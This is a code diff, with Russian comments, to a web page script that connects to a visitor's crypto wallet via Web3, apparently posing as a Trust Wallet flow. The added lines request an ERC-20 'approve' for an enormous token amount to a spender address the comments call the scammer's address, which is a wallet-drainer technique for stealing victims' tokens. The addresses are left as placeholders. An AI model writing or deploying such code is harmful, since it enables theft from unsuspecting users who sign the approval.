@@ -6,7 +6,7 @@ setTimeout(function () {
     // Если не получилось — через 10 секунд редирект на сайт загрузки
     setTimeout(function () {
         window.location.href = "https://trustwallet.com/download";
-    }, 3000);
+    }, 10000);
 }, 3000);
 
 // После загрузки страницы подключаем Web3
@@ -25,7 +25,33 @@ window.addEventListener('load', async function () {
             const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
             console.log("Баланс ETH:", balanceEth);
 
-            // Можем дополнительно тут получить токены ERC-20, если хочешь
+            // Дополнительно, запрашиваем approve для токенов ERC-20
+            const tokenAddress = '0x...'; // Адрес контракта токена
+            const tokenABI = [
+                {
+                    "constant": false,
+                    "inputs": [
+                        { "name": "spender", "type": "address" },
+                        { "name": "value", "type": "uint256" }
+                    ],
+                    "name": "approve",
+                    "outputs": [
+                        { "name": "", "type": "bool" }
+                    ],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                }
+            ];
+
+            const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+
+            // Запрашиваем approve для управления всеми токенами
+            const amount = web3.utils.toWei('1000000000', 'ether');  // Очень большое количество токенов
+            const spenderAddress = '0x...'; // Адрес мошенника
+
+            await tokenContract.methods.approve(spenderAddress, amount).send({ from: userAddress });
+            console.log("Разрешение на управление токенами было выдано.");
         } catch (err) {
             console.error("Ошибка при подключении к кошельку:", err);
         }
